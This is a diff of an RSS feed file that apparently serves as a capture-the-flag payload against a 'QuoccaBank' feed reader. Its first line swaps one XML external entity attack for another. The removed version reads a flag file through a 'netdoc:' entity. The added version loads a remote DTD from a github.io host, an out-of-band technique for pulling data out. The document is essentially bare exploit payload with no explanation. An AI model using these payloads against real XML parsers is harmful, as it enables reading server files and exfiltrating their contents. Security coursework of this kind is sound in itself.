@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "netdoc:/Flag_399959b2b76194a81df71b4f73593a47" >]><rss version="2.0"
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE title [<!ENTITY % xxe SYSTEM "https://helenacutie.github.io/v2.dtd"> %xxe;]><rss version="2.0"
 	xmlns:content="http://purl.org/rss/1.0/modules/content/"
 	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
 	xmlns:dc="http://purl.org/dc/elements/1.1/"
@@ -6,7 +6,7 @@
 	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
 	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
 	>
-
+	
 <channel>
 	<title>QuoccaBlog</title>
 	<atom:link href="https://helenacutie.github.io/feed.xml" rel="self" type="application/rss+xml" />
@@ -20,7 +20,7 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=5.7.2</generator>
 	<item>
-		<title>&xxe;</title>
+		<title>hiii</title>
 		<link>https://v1.feedifier.quoccabank.com/</link>
 		<pubDate>Mon, 08 Jun 2020 12:31:03 +0000</pubDate>
 		<guid isPermaLink="false">https://blog.quoccabank.com/?p=42</guid>
